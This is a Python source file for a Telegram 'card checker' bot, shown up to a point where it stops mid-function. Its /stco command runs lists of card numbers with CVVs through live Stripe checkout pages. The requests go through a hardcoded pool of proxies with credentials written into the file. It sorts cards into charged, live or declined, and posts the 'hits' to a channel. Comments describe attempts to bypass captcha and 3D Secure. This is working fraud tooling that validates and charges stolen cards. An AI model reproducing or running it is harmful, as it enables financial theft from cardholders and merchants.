import re
import json
import time
import html
import asyncio
import logging
from typing import List, Dict, Optional, Any

from aiogram import Router, F, types, Bot
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.exceptions import TelegramBadRequest

from database import get_user_credits, update_credits, create_user
from autohitters.hit import run_hit_check

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ROUTER & LOGGING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

router = Router()
logger = logging.getLogger(__name__)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIGURATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

MAX_CARDS         = 10
PARALLEL_LIMIT    = 1
UPDATE_EVERY      = 1
RESULTS_PER_PAGE  = 10
HIT_CHANNEL_ID    = -1003912886127
BOT_URL           = "https://t.me/CHKXWZ_BOT"
MAX_PROXY_RETRIES = 3

STCO_SESSIONS: Dict[int, Dict[str, Any]] = {}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROXY CONFIGURATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

PROXIES = [
    "http://3dfw7c6x:oSeqx0CNeV0k@103.183.121.128:58122",
    "http://azqdr5vn:71WCPuMwyc72@103.183.121.211:11657",
    "http://y7g4dd8d:Buw96jtGFKA5@103.183.121.59:34219",
    "http://zqrn9y5d:zQRN9y5d@103.156.91.173:58798",
    "http://dz46cabj:ksuRcKlNqJMU@103.161.113.230:18491",
    "http://RrkJjUqfT:jYEH6Emdg@82.117.94.14:63126",
    "http://1DnugnypC:4yPtzMd3f@193.254.17.97:64708",
    "http://nWtrJqsb:RYYEE72Y@194.33.9.114:64170",
    "http://nWtrJqsb:RYYEE72Y@194.33.9.136:49520",
    "http://oldg6k2r:oLdG6k2R@135.148.117.75:59813",
]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CUSTOM EMOJI IDs  (replace with your real IDs)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

EMOJI_CHARGED  = "5427168083074628963"   # ✅ charged / paid
EMOJI_LIVE     = "6100515480735321747"   # 💳 live (insufficient / cvc)
EMOJI_3DS      = "5273914604752216432"   # 🔐 3DS / captcha
EMOJI_DECLINED = "5273914604752216432"   # ❌ declined
EMOJI_STOP     = "6100541628496219252"   # 🛑 stop

def _safe_amount(raw: Any, currency: str) -> str:
    """Convert Stripe cents integer to a human-readable string."""
    if not raw:
        return "N/A"
    try:
        amt = float(raw)
        if amt == 0:
            return "Trial"
        if currency.upper() in ("JPY", "KRW", "VND", "IDR"):
            return f"{int(amt)} {currency.upper()}"
        return f"{amt / 100:.2f} {currency.upper()}"
    except (ValueError, TypeError):
        return "N/A"


def _domain_from_url(url: str) -> str:
    """Return just the hostname (e.g. replit.com) from any URL."""
    try:
        from urllib.parse import urlparse
        host = urlparse(url).hostname or ""
        return host[4:] if host.startswith("www.") else host
    except Exception:
        return url[:40]


def _fmt(msg: str, code: str) -> str:
    """
    Canonical display string: "{message} ({code})"
    e.g. "Your card was declined. (generic_decline)"
    """
    msg  = (msg or "").strip()
    code = (code or "unknown").strip().lower()
    if msg and not msg.endswith("."):
        msg += "."
    return f"{msg} ({code})" if msg else f"({code})"


def _result(card, status, code, display, emoji, amount, currency, is_hit=False, merchant="") -> dict:
    return {
        "card":     card,
        "status":   status,    # approved | live | declined | 3ds | captcha | error
        "code":     code,
        "display":  display,
        "emoji":    emoji,
        "amount":   amount,
        "currency": currency,
        "is_hit":   is_hit,
        "merchant": merchant,
    }


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HITTER CORE  (delegated to autohitters/hit.py)
#
# The bot no longer drives api.stripe.com directly. run_hit_check() from
# hit.py owns the whole checkout attempt (endpoint, proxy rotation, retries,
# 3DS/captcha classification); this adapter only translates its dict into the
# result shape this module's UI already consumes, so every caption, the hit
# channel message and the pagination all stay byte-identical to before.
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# ── Decline-code extraction ───────────────────────────────────────────────
# The old inline Stripe hitter surfaced the real gateway code
# ("Your card was declined. (generic_decline)"). hit.php instead hands back a
# coarse api_status of charge/live/dead, so the precise code has to be dug back
# out of the raw body. Priority order mirrors autohitters/stco.js.

_CODE_KEYS = ("decline_code", "declineCode", "error_code", "errorCode", "code")

_PI_STATUS_CODES = {
    "requires_payment_method": "generic_decline",
    "requires_action":         "authentication_required",
    "requires_confirmation":   "requires_confirmation",
    "processing":              "processing",
    "succeeded":               "succeeded",
    "complete":                "succeeded",
    "canceled":                "canceled",
}

# Codes that mean "the bot could not clear the challenge", not "bad card".
_CAPTCHA_CODES = {
    "captcha_required", "hcaptcha_required", "captcha_failed",
    "verification_failed", "invalid_captcha", "challenge_failed",
}
_3DS_CODES = {
    "authentication_required", "3d_secure_required", "3ds_required",
    "payment_3ds_failure", "generic_3ds_failed", "three_d_secure",
}

_TRAILING_CODE_RE = re.compile(r"\s*[\(\[][a-z0-9_\- ]+[\)\]]\s*$", re.I)

# ── Message normalisation ────────────────────────────────────────────────
# hit.php echoes back the gateway message verbatim, which is often just the
# decline code restated in prose — sometimes with typos, e.g. the literal
# "Genric Decline" for generic_decline. Showing that verbatim produces
# "Genric Decline. (generic_decline)", so a message that carries no information
# beyond the code is replaced with the canonical Stripe wording.

_CANONICAL_MESSAGES = {
    "generic_decline":           "Your card was declined",
    "do_not_honor":              "Your card was declined",
    "fraudulent":                "Your card was declined",
    "lost_card":                 "Your card was declined",
    "stolen_card":               "Your card was declined",
    "transaction_not_allowed":   "Your card was declined",
    "insufficient_funds":        "Your card has insufficient funds",
    "incorrect_cvc":             "Your card's security code is incorrect",
    "invalid_cvc":               "Your card's security code is invalid",
    "incorrect_number":          "Your card number is incorrect",
    "invalid_number":            "Your card number is invalid",
    "expired_card":              "Your card has expired",
    "incorrect_pin":             "Your card's PIN is incorrect",
    "incorrect_zip":             "Your card's ZIP code is incorrect",
    "invalid_expiry_month":      "Your card's expiration month is invalid",
    "invalid_expiry_year":       "Your card's expiration year is invalid",
    "card_velocity_exceeded":    "Your card has been used too many times in a short period",
    "card_not_supported":        "Your card does not support this type of purchase",
    "currency_not_supported":    "Your card does not support this currency",
    "duplicate_transaction":     "Duplicate transaction",
    "amount_too_large":          "The charge amount is too large",
    "amount_too_small":          "The charge amount is too small",
    "processing_error":          "An error occurred while processing your card",
    "payment_intent_authentication_failure": "The payment method failed authentication",
    "authentication_required":   "3D Secure authentication required",
    "3d_secure_required":        "3D Secure authentication required",
    "3ds_required":              "3D Secure authentication required",
    "payment_3ds_failure":       "The payment method failed authentication",
    "generic_3ds_failed":        "The payment method failed authentication",
    "three_d_secure":            "3D Secure authentication required",
    "captcha_required":          "Stripe hcaptcha challenge triggered",
    "hcaptcha_required":         "Stripe hcaptcha challenge triggered",
    "captcha_failed":            "Stripe hcaptcha challenge triggered",
    "verification_failed":       "Stripe hcaptcha challenge triggered",
    "invalid_captcha":           "Stripe hcaptcha challenge triggered",
    "challenge_failed":          "The 3D Secure challenge could not be completed",
    "checkout_not_active_session": "Checkout session is no longer active",
    "invalid_session":           "Checkout session is no longer active",
    "api_error":                 "Checkout API error",
    "checkout_failed":           "Checkout failed",
    "pk_extract_failed":         "Could not extract the publishable key",
    "pm_creation_failed":        "Could not create the payment method",
    "invalid_session_id":        "Checkout session is no longer active",
    "proxy_error":               "Proxy error",
    "timeout":                   "Request timed out",
    "connection_error":          "Connection error",
    "succeeded":                 "Payment successful",
    "processing":                "Payment is processing",
}

# Words that never add information beyond the code itself.
_VAGUE_WORDS = {
    "", "dead", "die", "dying", "declined", "decline", "declin", "genric",
    "generic", "genral", "generl", "genericl", "error", "err", "failed",
    "fail", "failure", "rejected", "reject", "denied", "deny", "unknown",
    "none", "null", "n/a", "na", "bad", "false", "falsecard", "invalid",
    "not enough funds", "no", "no card", "card", "payment", "transaction",
}

# Common misspellings seen in gateway echoes.
_TYPO_FIXES = (
    ("genric", "generic"), ("genaric", "generic"), ("generik", "generic"),
    ("generick", "generic"), ("genral", "generic"), ("generl", "generic"),
    ("genericl", "generic"), ("generilc", "generic"), ("gneric", "generic"),
    ("declin", "decline"), ("decline", "decline"), ("rejected", "rejected"),
    ("insufficiant", "insufficient"), ("insufcient", "insufficient"),
    ("insufficent", "insufficient"), ("expierd", "expired"),
    ("fraudulant", "fraudulent"), ("verifcation", "verification"),
)


def _fix_typos(text: str) -> str:
    """Correct the misspelling variants the gateway echoes back."""
    out = text or ""
    for bad, good in _TYPO_FIXES:
        out = re.sub(rf"\b{bad}\b", good, out, flags=re.I)
    return out


def _is_vague_message(msg: str, code: str) -> bool:
    """
    True when the message only restates the decline code (or is filler),
    so the canonical wording is more useful than the echo.
    """
    # Underscores split first: "genric_decline" is one token but two words.
    text = re.sub(r"[_\-]+", " ", msg or "")
    words = [w for w in re.sub(r"[^a-z0-9\s]+", " ", _fix_typos(text).lower()).split() if w]
    if not words:
        return True
    # "Genric Decline" / "generic_decline" / "decline" / "rejected"
    if all(w in _VAGUE_WORDS for w in words):
        return True
    # Message that is just the code, or the code's words in another order.
    code_words = [w for w in _clean_code(code).split("_") if w]
    if code_words and sorted(words) == sorted(code_words):
        return True
    # Ultra-short echo such as "no" / "bad".
    if len("".join(words)) <= 3:
        return True
    return False


def _normalise_message(msg: str, code: str) -> str:
    """
    Return a message worth showing for `code`.

    Falls back to the canonical Stripe wording whenever the gateway echo is
    vague, empty, or just a typo'd copy of the code.
    """
    canonical = _CANONICAL_MESSAGES.get(_clean_code(code), "")
    cleaned = _strip_trailing_code(msg).strip()
    if not cleaned:
        return canonical
    if canonical and _is_vague_message(cleaned, code):
        return canonical
    if not canonical:
        return cleaned
    return cleaned

# Coarse hit.php statuses are not real gateway codes — swap them for the
# canonical equivalent so a line never reads "... (dead)".
_COARSE_CODES = {
    "charge": "succeeded", "charged": "succeeded", "live": "insufficient_funds",
    "dead": "generic_decline", "declined": "generic_decline", "error": "api_error",
}


def _clean_code(val: Any) -> str:
    """Normalise a raw code value into a bare lowercase token."""
    if val is None:
        return ""
    code = str(val).strip().lower()
    code = code.strip("()[]{} \t\"'")
    return re.sub(r"\s+", "_", code)[:60]


def _code_from_obj(obj: Any) -> str:
    """Pull the first usable decline code out of a dict (breadth-first)."""
    if not isinstance(obj, dict):
        return ""
    for key in _CODE_KEYS:
        code = _clean_code(obj.get(key))
        # Skip obvious non-decline codes so we keep digging.
        if code and code not in {"ok", "true", "false", "1", "0", "none", "null"}:
            return code
    return ""


def _find_pi_status(obj: Any, depth: int = 0) -> str:
    """Locate a PaymentIntent-style status string anywhere in the body."""
    if depth > 4:
        return ""
    if isinstance(obj, dict):
        for key in ("status", "pi_status", "intent_status"):
            val = str(obj.get(key) or "").strip().lower()
            if val in _PI_STATUS_CODES:
                return val
        for val in obj.values():
            found = _find_pi_status(val, depth + 1)
            if found:
                return found
    elif isinstance(obj, list):
        for item in obj[:5]:
            found = _find_pi_status(item, depth + 1)
            if found:
                return found
    return ""


def _extract_decline_code(raw: Any, result_msg: str, api_status: str) -> str:
    """
    Recover the gateway's real decline code from hit.php's raw body.

    Falls back through: direct error object → last_payment_error →
    payment-intent status → any nested code field → code already embedded in the
    message → the coarse api_status.
    """
    body = raw if isinstance(raw, dict) else {}

    # 1) Direct error object (immediate decline from /confirm), searched at any
    #    depth so nested last_payment_error bodies are also caught.
    def _deep_code(node: Any, depth: int = 0) -> str:
        if not isinstance(node, dict) or depth > 4:
            return ""
        code = _code_from_obj(node)
        if code:
            return code
        for key in ("error", "last_payment_error", "last_error", "response",
                    "payment_intent", "payment_method"):
            if key in node:
                code = _deep_code(node[key], depth + 1)
                if code:
                    return code
        for val in node.values():
            if isinstance(val, dict):
                code = _deep_code(val, depth + 1)
                if code:
                    return code
        return ""

    for holder in ("error", "last_payment_error", "last_error", "response", "payment_intent"):
        if holder in body:
            code = _deep_code(body[holder])
            if code:
                return code

    # 2) PaymentIntent status → readable code.
    pi_status = _find_pi_status(body)
    if pi_status:
        return _PI_STATUS_CODES[pi_status]

    # 3) Any top-level / nested code field.
    code = _code_from_obj(body)
    if code:
        return code

    # 4) Code already embedded in the message, e.g. "... (generic_decline)".
    m = re.search(r"[\(\[]\s*([a-z0-9_\-]{3,})\s*[\)\]]\s*$", (result_msg or "").lower())
    if m:
        return _clean_code(m.group(1))

    # 5) Coarse api_status is better than nothing.
    return _clean_code(api_status) or "declined"


def _semantic_code(code: str, default: str) -> str:
    """
    Replace a coarse hit.php status with a real-looking code.

    Only the fallback path produces codes like "dead"; a genuine
    decline_code from the gateway is always kept as-is.
    """
    code = _clean_code(code)
    return _COARSE_CODES.get(code, code) or default


def _branch_code(code: str, default: str) -> str:
    """
    Same as _semantic_code, but a coarse status inside a captcha/3DS branch
    becomes that branch's own code — a failed 3DS bypass must not be reported
    as "generic_decline".
    """
    code = _clean_code(code)
    return default if code in _COARSE_CODES else (code or default)


def _strip_trailing_code(msg: str) -> str:
    """Remove a trailing "(code)" so _fmt() doesn't append it twice."""
    return _TRAILING_CODE_RE.sub("", msg or "").strip()


def _map_hit_result(card: str, out: dict) -> dict:
    """Translate a run_hit_check() response into this module's _result() shape."""
    if not isinstance(out, dict):
        out = {}

    if not out.get("ok"):
        err = str(out.get("error") or "Checkout failed")
        res = _result(
            card, "error", "checkout_failed",
            _fmt(err[:100], "error"),
            EMOJI_DECLINED, 0, "USD",
        )
        if out.get("session_dead"):
            # Lets run_stco_check stop the run and show the Expired state.
            res["code"] = "checkout_not_active_session"
            res["status"] = "declined"
            res["display"] = _fmt(
                _normalise_message(err[:100], "checkout_not_active_session")
                    or "Checkout session is no longer active",
                "checkout_not_active_session",
            )
        return res

    api_status   = str(out.get("api_status") or "")
    result_msg   = str(out.get("result_msg") or "Unknown")
    result_state = str(out.get("result_status") or "declined").lower()
    merchant     = str(out.get("merchant") or "")
    amount       = int(out.get("amount_cents") or 0)
    currency     = str(out.get("currency") or "USD")
    hcaptcha     = bool(out.get("hcaptcha"))
    msg_lower    = result_msg.lower()

    # Real gateway code (generic_decline, insufficient_funds, ...) recovered
    # from hit.php's raw body, so the line reads like the old inline hitter.
    code = _extract_decline_code(out.get("raw"), result_msg, api_status)

    # A challenge the bot failed to clear, by code or by message. The real
    # code is kept in `code` and shown in the display so a failed captcha or
    # 3DS bypass is identifiable, not just lumped into one bucket.
    if hcaptcha or code in _CAPTCHA_CODES or "captcha" in msg_lower:
        c = _branch_code(code, "captcha_required")
        msg = _normalise_message(result_msg, c) or "Stripe hcaptcha challenge triggered"
        res = _result(card, "captcha", c, _fmt(msg, c), EMOJI_3DS, amount, currency)
    elif code in _3DS_CODES or (
        not out.get("3d_bypassed")
        and ("3ds" in msg_lower or "challenge" in msg_lower or "authentication" in msg_lower)
    ):
        c = _branch_code(code, "3ds_required")
        msg = _normalise_message(result_msg, c) or "3D Secure authentication required"
        res = _result(card, "3ds", c, _fmt(msg, c), EMOJI_3DS, amount, currency)
    # Money actually moved.
    elif result_state == "charged":
        c = _semantic_code(code, "succeeded")
        msg = _normalise_message(result_msg, c) or "Payment successful"
        res = _result(card, "approved", c, _fmt(msg, c),
                      EMOJI_CHARGED, amount, currency, is_hit=True)
    # Real card, soft decline — the classic "save this card" state.
    elif result_state == "approved":
        c = _semantic_code(code, "live")
        msg = _normalise_message(result_msg, c) or "Your card has insufficient funds"
        res = _result(card, "live", c, _fmt(msg, c),
                      EMOJI_LIVE, amount, currency, is_hit=True)
    else:
        c = _semantic_code(code, "generic_decline")
        msg = _normalise_message(result_msg, c) or "Your card was declined"
        res = _result(card, "declined", c, _fmt(msg, c),
                      EMOJI_DECLINED, amount, currency)

    res["merchant"] = merchant
    if out.get("session_dead"):
        res["code"] = "checkout_not_active_session"
    return res


async def hit_checkout(url: str, card: str) -> dict:
    """
    One checkout attempt for one card.

    run_hit_check() is blocking (requests + up to MAX_PROXY_RETRIES proxy
    rotations), so it runs in a worker thread. The hardcoded PROXIES list is
    handed over as the pool; hit.py converts each entry to the
    host:port:user:pass form its endpoint expects.
    """
    try:
        out = await asyncio.to_thread(
            run_hit_check,
            url,
            card,
            None,                   # proxy_data — PROXIES is the pool
            MAX_PROXY_RETRIES,
            PROXIES,
        )
        return _map_hit_result(card, out)
    except asyncio.CancelledError:
        raise
    except Exception as e:
        logger.error(f"hit_checkout error: {e}")
        return _result(card, "error", "api_error",
                       _fmt(str(e)[:100], "api_error"), EMOJI_DECLINED, 0, "USD")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HIT CHANNEL NOTIFICATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def send_hit_message(bot: Bot, res: dict, user_name: str, user_id: int):
    """Send a hit notification to the log channel (matches whop.py format)."""
    try:
        user_link  = f"<a href='tg://user?id={user_id}'>{html.escape(user_name)}</a>"
        emoji_id   = res.get("emoji", EMOJI_CHARGED)
        emoji_part = f'<tg-emoji emoji-id="{emoji_id}">🔥</tg-emoji>'
        amount_str = _safe_amount(res.get("amount", 0), res.get("currency", "USD"))
        display    = html.escape(res.get("display", ""))

        hit_msg = (
            f"<b><a href='https://t.me/broken_wiz'>[  ɧ ι 𝛕  ]</a></b> "
            f"<b>➺ Sᴛʀɪᴘᴇ Cʜᴇᴄᴋᴏᴜᴛ</b> {emoji_part}\n"
            f"<b>Aᴍᴏᴜɴᴛ ➺ {html.escape(amount_str)}</b>\n"
            f"<b>Rᴀᴡ ➺</b> <code>{display}</code>\n"
            f"<b>Usᴇʀ ➺ {user_link}</b>"
        )

        reply_markup = InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(
                text="𝘾𝙃𝙆 𝕏 [𝙒 𝙄 𝙕] ",
                url=BOT_URL,
                style="primary",
                icon_custom_emoji_id="5445104308884370368",
            )
        ]])

        await bot.send_message(
            chat_id=HIT_CHANNEL_ID,
            text=hit_msg,
            parse_mode="HTML",
            reply_markup=reply_markup,
            disable_web_page_preview=True,
        )
    except Exception as e:
        logger.error(f"send_hit_message failed: {e}")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# COMMAND HANDLER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(F.text.startswith("/stco"))
async def stco_command(message: types.Message):
    user_id   = message.from_user.id
    user_name = message.from_user.first_name or "User"
    username  = message.from_user.username

    url       = ""
    raw_cards: List[str] = []

    # Parse URL and inline cards
    text_content = message.text or ""
    parts = text_content.split()[1:] if " " in text_content else []
    if parts:
        potential_url = parts[0]
        if potential_url.startswith("http"):
            url = potential_url
            raw_cards.extend(parts[1:])

    # Cards from replied-to message
    if message.reply_to_message:
        replied = (
            message.reply_to_message.text
            or message.reply_to_message.caption
            or ""
        )
        raw_cards.extend(replied.split('\n'))

    if not url:
        await message.reply(
            "❌ <b>Invalid Format!</b>\n\n"
            "Usage: <code>/stco &lt;stripe_checkout_url&gt; &lt;card1&gt; ...</code>\n"
            "Or reply to a list of cards.",
            parse_mode="HTML",
        )
        return

    card_pattern = re.compile(
        r'(\d{13,19})[\|/:\s]+(\d{1,2})[\|/:\s]+(\d{2,4})[\|/:\s]+(\d{3,4})'
    )
    valid_cards: List[str] = []
    seen: set = set()
    for item in raw_cards:
        m = card_pattern.search(item)
        if m:
            cc, mm, yy, cvv = m.groups()
            mm = mm.zfill(2)
            if len(yy) == 4:
                yy = yy[2:]
            fmt = f"{cc}|{mm}|{yy}|{cvv}"
            if fmt not in seen:
                seen.add(fmt)
                valid_cards.append(fmt)

    if len(valid_cards) > MAX_CARDS:
        await message.reply(
            f"❌ <b>Limit Exceeded!</b>\n\nMax allowed: {MAX_CARDS}",
            parse_mode="HTML",
        )
        return

    if not valid_cards:
        await message.reply("⚠️ No valid cards found.", parse_mode="HTML")
        return

    # ── Credit deduction ──────────────────────────────────────────────────────
    try:
        await asyncio.to_thread(create_user, user_id, username)
        credits = await asyncio.to_thread(get_user_credits, user_id)

        if credits is None or credits < 1:
            await message.reply(
                "❌ <b>Iɴsᴜғғɪᴄɪᴇɴᴛ Cʀᴇᴅɪᴛs</b>\n\n"
                "Yᴏᴜ Nᴇᴇᴅ Aᴛ Lᴇᴀsᴛ <b>1 Cʀᴇᴅɪᴛ</b> Tᴏ Usᴇ Tʜɪs Gᴀᴛᴇ.\n"
                "Usᴇ /plan Tᴏ Gᴇᴛ Mᴏʀᴇ.",
                parse_mode="HTML",
            )
            return

        await asyncio.to_thread(update_credits, user_id, credits - 1)
        logger.info(f"[STCO] User {user_id} used 1 credit. Remaining: {credits - 1}")

    except Exception as e:
        logger.error(f"Credit check failed for {user_id}: {e}")
        await message.reply(
            "⚠️ <b>Database Error.</b>\nCould not verify credits. Please try again.",
            parse_mode="HTML",
        )
        return

    # Kick off the async check (non-blocking)
    asyncio.create_task(
        run_stco_check(message, url, valid_cards, user_name, user_id)
    )


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ASYNC MASS CHECKER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def run_stco_check(
    message: types.Message,
    url: str,
    cards: List[str],
    user_name: str,
    user_id: int,
):
    start_time  = time.time()
    total_cards = len(cards)
    bot         = message.bot
    site_label  = _domain_from_url(url)   # e.g. "replit.com" — upgraded to merchant name later

    # Initial status message
    status_msg = await message.reply(
        f"<b>Gᴀᴛᴇ ➺ Sᴛʀɪᴘᴇ Cʜᴇᴄᴋᴏᴜᴛ</b>\n"
        f"<b>Sɪᴛᴇ ➺ {html.escape(site_label)}</b>\n"
        f"<b>Pʀᴏɢʀᴇss ➺ 0/{total_cards}</b>\n"
        f"<b>Aᴍᴏᴜɴᴛ ➺ N/A</b>\n"
        f"<b>Sᴛᴀᴛᴜs ➺ Hɪᴛᴛɪɴɢ…</b>\n"
        f"━━━━━━━━━━━━━━━━",
        parse_mode="HTML",
        disable_web_page_preview=True,
    )
    msg_id = status_msg.message_id

    STCO_SESSIONS[msg_id] = {
        "results":      [],
        "page":         0,
        "total_cards":  total_cards,
        "start_time":   start_time,
        "user_name":    user_name,
        "user_id":      user_id,
        "msg_id":       msg_id,
        "amount":       "N/A",
        "site_label":   site_label,
        "final_status": "checking",
        "current_card": None,  # card currently being hit → shows Pʀᴏᴄᴇssɪɴɢ…
        "stopped":      False,
        "tasks":        [],
    }

    # ── No PK/CS extraction needed ────────────────────────────────────────────
    # hit.py takes the full checkout URL and resolves everything server-side,
    # so URLs without a #hash / cs_live_ marker are now accepted.

    sem     = asyncio.Semaphore(PARALLEL_LIMIT)
    results: List[dict] = []
    paid_found  = False
    is_expired  = False

    async def worker(card: str):
        nonlocal paid_found
        async with sem:
            # Show Pʀᴏᴄᴇssɪɴɢ… immediately
            STCO_SESSIONS[msg_id]["current_card"] = card
            try:
                _el = round(time.time() - start_time, 2)
                _tx = format_page_content(STCO_SESSIONS[msg_id], _el, is_working=True)
                await status_msg.edit_text(_tx, parse_mode="HTML",
                                           reply_markup=get_keyboard(msg_id))
            except Exception:
                pass

            res = await hit_checkout(url, card)

            # Upgrade site_label to real merchant name the first time we get one
            if res.get("merchant") and STCO_SESSIONS[msg_id]["site_label"] == _domain_from_url(url):
                STCO_SESSIONS[msg_id]["site_label"] = res["merchant"]

            # Update global amount once we have it
            if res.get("amount") and STCO_SESSIONS[msg_id]["amount"] == "N/A":
                STCO_SESSIONS[msg_id]["amount"] = _safe_amount(
                    res["amount"], res.get("currency", "USD")
                )

            STCO_SESSIONS[msg_id]["current_card"] = None

            if res["is_hit"]:
                paid_found = res["status"] == "approved"
                asyncio.create_task(send_hit_message(bot, res, user_name, user_id))

            return res

    # Create all tasks
    tasks   = [asyncio.create_task(worker(c)) for c in cards]
    STCO_SESSIONS[msg_id]["tasks"] = tasks
    pending = set(tasks)

    while pending:
        done, pending = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)

        for task in done:
            if task.cancelled():
                continue
            try:
                res = task.result()
                results.append(res)

                # Stop on first successful charge
                if res["status"] == "approved":
                    for t in pending:
                        t.cancel()
                    pending = set()
                    break

                # Stop if session expired
                if res.get("code") == "checkout_not_active_session":
                    is_expired = True
                    STCO_SESSIONS[msg_id]["final_status"] = "expired"
                    for t in pending:
                        t.cancel()
                    pending = set()
                    break

            except Exception as e:
                logger.error(f"Worker task error: {e}")

        # Sort: approved → live → 3ds/captcha → declined → error
        results.sort(key=lambda x: {
            "approved": 0, "live": 1, "3ds": 2,
            "captcha": 2, "declined": 3, "error": 4,
        }.get(x["status"], 5))

        if len(results) % UPDATE_EVERY == 0 or not pending:
            elapsed = round(time.time() - start_time, 2)
            STCO_SESSIONS[msg_id]["results"] = results
            STCO_SESSIONS[msg_id]["elapsed_final"] = elapsed

            still = bool(pending) and not STCO_SESSIONS[msg_id].get("stopped")
            text  = format_page_content(STCO_SESSIONS[msg_id], elapsed, is_working=still)
            try:
                await status_msg.edit_text(text, parse_mode="HTML",
                                           reply_markup=get_keyboard(msg_id))
            except TelegramBadRequest:
                pass
            except Exception as e:
                logger.error(f"UI update error: {e}")

    # ── Finalize ──────────────────────────────────────────────────────────────
    elapsed_final = round(time.time() - start_time, 2)
    STCO_SESSIONS[msg_id]["elapsed_final"] = elapsed_final
    if STCO_SESSIONS[msg_id].get("stopped"):
        STCO_SESSIONS[msg_id]["final_status"] = "stopped"
    elif not is_expired:
        STCO_SESSIONS[msg_id]["final_status"] = "completed"

    final_text = format_page_content(STCO_SESSIONS[msg_id], elapsed_final, is_working=False)
    try:
        await status_msg.edit_text(final_text, parse_mode="HTML",
                                   reply_markup=get_keyboard(msg_id))
    except TelegramBadRequest:
        pass


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# FORMATTING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def format_page_content(state: Dict[str, Any], elapsed: float, is_working: bool) -> str:
    results = state["results"]
    page    = state["page"]
    start   = page * RESULTS_PER_PAGE
    page_results = results[start: start + RESULTS_PER_PAGE]

    amount      = state.get("amount", "N/A")
    total_cards = state["total_cards"]
    progress    = f"{len(results)}/{total_cards}"

    # Overall session status line
    has_paid = any(r["status"] == "approved" for r in results)
    has_live = any(r["status"] == "live" for r in results)

    if has_paid:
        status_text = f'Pᴀɪᴅ <tg-emoji emoji-id="{EMOJI_CHARGED}">✅</tg-emoji>'
    elif has_live:
        status_text = f'Lɪᴠᴇ <tg-emoji emoji-id="{EMOJI_LIVE}">💳</tg-emoji>'
    elif is_working:
        status_text = 'Hɪᴛᴛɪɴɢ…<tg-emoji emoji-id="6154603635981423575">⏳</tg-emoji>'
    else:
        final = state.get("final_status", "completed")
        if final == "expired":
            status_text = f'Exᴘɪʀᴇᴅ <tg-emoji emoji-id="{EMOJI_DECLINED}">⚠️</tg-emoji>'
        elif final == "stopped" or state.get("stopped"):
            status_text = f'Sᴛᴏᴘᴘᴇᴅ <tg-emoji emoji-id="{EMOJI_STOP}">🛑</tg-emoji>'
        else:
            status_text = f'Nᴏᴛ Pᴀɪᴅ <tg-emoji emoji-id="{EMOJI_DECLINED}">❌</tg-emoji>'

    site_label = html.escape(state.get("site_label", ""))

    text = (
        f"<b>Gᴀᴛᴇ ➺ Sᴛʀɪᴘᴇ Cʜᴇᴄᴋᴏᴜᴛ</b>\n"
        f"<b>Sɪᴛᴇ ➺ {site_label}</b>\n"
        f"<b>Pʀᴏɢʀᴇss ➺ {progress}</b>\n"
        f"<b>Aᴍᴏᴜɴᴛ ➺ {html.escape(amount)}</b>\n"
        f"<b>Sᴛᴀᴛᴜs ➺ {status_text}</b>\n"
        f"━━━━━━━━━━━━━━━━"
    )

    for res in page_results:
        emoji   = res.get("emoji", EMOJI_DECLINED)
        display = html.escape(res.get("display", "Unknown"))
        text += (
            f"\n<code>{res['card']}</code>\n"
            f"<b>{display}</b> "
            f'<tg-emoji emoji-id="{emoji}">❌</tg-emoji>\n'
            f"━━━━━━━━━━━━━━━━"
        )

    # Pʀᴏᴄᴇssɪɴɢ… for the card currently being hit
    current_card = state.get("current_card")
    if is_working and current_card:
        text += (
            f"\n<code>{current_card}</code>\n"
            f'<b>Pʀᴏᴄᴇssɪɴɢ…</b><tg-emoji emoji-id="6154603635981423575">⏳</tg-emoji>\n'
            f"━━━━━━━━━━━━━━━━"
        )

    return text


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PAGINATION KEYBOARD
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def get_keyboard(msg_id: int) -> Optional[InlineKeyboardMarkup]:
    state = STCO_SESSIONS.get(msg_id)
    if not state:
        return None

    total = len(state["results"])
    pages   = (total + RESULTS_PER_PAGE - 1) // RESULTS_PER_PAGE if total else 1
    current = state["page"]
    buttons = []
    row     = []

    if current > 0:
        row.append(InlineKeyboardButton(text="◀ Back", callback_data=f"stco_prev_{msg_id}"))
    if current < pages - 1:
